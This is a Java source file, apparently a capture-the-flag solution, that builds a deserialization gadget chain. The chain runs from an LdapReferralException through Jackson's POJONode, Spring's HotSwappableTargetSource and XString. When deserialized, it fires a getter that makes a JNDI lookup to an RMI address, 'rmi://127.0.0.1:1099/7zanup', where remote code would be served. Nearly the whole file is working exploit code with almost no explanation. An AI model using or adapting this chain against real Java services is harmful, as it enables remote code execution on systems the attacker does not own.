package com.javasec.pocs.solutions.ycb;

import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.jndi.ldap.LdapReferralException;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import javax.naming.Name;
import javax.naming.ldap.Control;
import javax.naming.ldap.LdapName;
import javax.naming.ldap.SortControl;
import java.lang.reflect.Constructor;
import java.util.*;

public class ez_java {
    public static void main(String[] args) throws Exception {
        SerializeUtils.OverideJackson();
        Control[] controls = new Control[]{ new SortControl("a",true) };
        Class<?> clazz = Class.forName("com.sun.jndi.ldap.LdapReferralException");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Name.class,Object.class,Name.class,String.class, Hashtable.class,String.class,int.class,Control[].class);
        constructor.setAccessible(true);
        LdapReferralException ldapReferralException = (LdapReferralException) constructor.newInstance(new LdapName(""), new Object(), new LdapName(""), "", new Hashtable<>(), "var6", 7,controls);

        ldapReferralException.setResolvedObj("aa");
        Vector<String> vector = new Vector<String>();
        vector.add(0,"rmi://127.0.0.1:1099/7zanup");
        SerializeUtils.setFieldValue(ldapReferralException,"referrals",vector);
        SerializeUtils.setFieldValue(ldapReferralException,"referralCount",vector.size());
        POJONode jsonNodes = new POJONode(ldapReferralException);
        //JSONObject jsonObject = new JSONObject();
        //jsonObject.put("aaa",ldapReferralException);

        Object o = SerializeUtils.makeMap(new HotSwappableTargetSource(jsonNodes),new HotSwappableTargetSource(new XString("")));
        {
            System.out.println("测试rmi: 直接反序列化测试,利用XString+JSONArray触发getter函数getReferralContext");
            SerializeUtils.deserTester(o);
        }
    }
}
